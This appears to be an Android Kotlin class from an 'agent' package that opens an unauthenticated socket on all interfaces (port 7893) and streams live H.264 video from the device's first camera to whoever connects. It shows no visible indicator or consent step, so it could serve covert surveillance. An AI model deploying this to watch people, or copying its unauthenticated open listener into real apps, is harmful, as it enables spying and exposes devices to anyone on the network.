package com.dos.agent

import android.content.Context
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaFormat
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.Surface
import java.io.OutputStream
import java.net.InetAddress
import java.net.ServerSocket
import java.net.Socket
import java.nio.ByteBuffer
import java.util.concurrent.atomic.AtomicBoolean

class CameraProvider(private val context: Context) {

    companion object {
        private const val TAG = "CameraProvider"
        private const val CAMERA_PORT = 7893
        private const val BITRATE = 3_000_000
        private const val FRAME_RATE = 30
        private const val I_FRAME_INTERVAL = 2
        private const val WIDTH = 1280
        private const val HEIGHT = 720
        private const val MIME_AVC = "video/avc"
        private const val OUTPUT_FORMAT_CHANGED = -2
        private const val INFO_TRY_AGAIN_LATER = -1
    }

    private var isRunning = AtomicBoolean(false)
    private var cameraDevice: CameraDevice? = null
    private var encoder: MediaCodec? = null
    private var serverSocket: ServerSocket? = null
    private var clientSocket: Socket? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null

    fun isRunning(): Boolean = isRunning.get()

    fun start() {
        if (isRunning.get()) {
            Log.w(TAG, "Already running")
            return
        }
        isRunning.set(true)

        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread!!.looper)

        Thread({
            try {
                serverSocket = ServerSocket(CAMERA_PORT, 50, InetAddress.getByName("0.0.0.0"))
                Log.i(TAG, "Camera server listening on port $CAMERA_PORT")

                serverSocket?.accept()?.let { socket ->
                    clientSocket = socket
                    Log.i(TAG, "Camera client connected: ${socket.inetAddress}")
                    startCameraStream(socket)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Camera server error: ${e.message}")
            } finally {
                isRunning.set(false)
            }
        }, "Camera-Server").start()
    }

    fun stop() {
        isRunning.set(false)
        closeCamera()
        try {
            clientSocket?.close()
        } catch (_: Exception) {}
        try {
            serverSocket?.close()
        } catch (_: Exception) {}
        backgroundThread?.quitSafely()
    }

    private fun closeCamera() {
        try {
            cameraDevice?.close()
        } catch (_: Exception) {}
        try {
            encoder?.stop()
            encoder?.release()
        } catch (_: Exception) {}
    }

    private fun startCameraStream(socket: Socket) {
        val outputStream = socket.getOutputStream()

        val format = MediaFormat.createVideoFormat(MIME_AVC, WIDTH, HEIGHT).apply {
            setInteger(MediaFormat.KEY_BIT_RATE, BITRATE)
            setInteger(MediaFormat.KEY_FRAME_RATE, FRAME_RATE)
            setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, I_FRAME_INTERVAL)
            setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface)
        }

        val codec = MediaCodec.createEncoderByType(MIME_AVC)
        codec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
        val inputSurface: Surface = codec.createInputSurface()
        codec.start()
        encoder = codec

        // Open camera
        val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraId = manager.cameraIdList.firstOrNull() ?: run {
            Log.e(TAG, "No camera found")
            return
        }

        manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                cameraDevice = camera
                try {
                    val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                        addTarget(inputSurface)
                    }
                    val session = camera.createCaptureSession(
                        listOf(inputSurface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    session.setRepeatingRequest(captureRequest.build(), null, backgroundHandler)
                                    Log.i(TAG, "Camera streaming started: ${WIDTH}x${HEIGHT}")
                                } catch (e: Exception) {
                                    Log.e(TAG, "Start camera failed: ${e.message}")
                                }
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                Log.e(TAG, "Camera session configure failed")
                            }
                        },
                        backgroundHandler
                    )
                } catch (e: Exception) {
                    Log.e(TAG, "Create capture session failed: ${e.message}")
                }
            }

            override fun onDisconnected(camera: CameraDevice) {
                Log.w(TAG, "Camera disconnected")
                cameraDevice = null
            }

            override fun onError(camera: CameraDevice, error: Int) {
                Log.e(TAG, "Camera error: $error")
                cameraDevice = null
            }
        }, backgroundHandler)

        val bufferInfo = MediaCodec.BufferInfo()
        while (isRunning.get()) {
            try {
                val outputIndex = codec.dequeueOutputBuffer(bufferInfo, 10000)
                when {
                    outputIndex == INFO_TRY_AGAIN_LATER -> {}
                    outputIndex == OUTPUT_FORMAT_CHANGED -> {
                        Log.i(TAG, "Camera output format changed")
                    }
                    outputIndex >= 0 -> {
                        val outputBuffer: ByteBuffer = codec.getOutputBuffer(outputIndex) ?: continue
                        val frameData = ByteArray(bufferInfo.size)
                        outputBuffer.position(bufferInfo.offset)
                        outputBuffer.get(frameData, 0, bufferInfo.size)

                        val sizePrefix = ByteBuffer.allocate(4).putInt(frameData.size).array()
                        try {
                            outputStream.write(sizePrefix)
                            outputStream.write(frameData)
                            outputStream.flush()
                        } catch (e: Exception) {
                            Log.w(TAG, "Camera client disconnected: ${e.message}")
                            break
                        }

                        codec.releaseOutputBuffer(outputIndex, false)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Camera encoding error: ${e.message}")
                break
            }
        }

        closeCamera()
        try { outputStream.close() } catch (_: Exception) {}
        Log.i(TAG, "Camera stream stopped")
    }
}
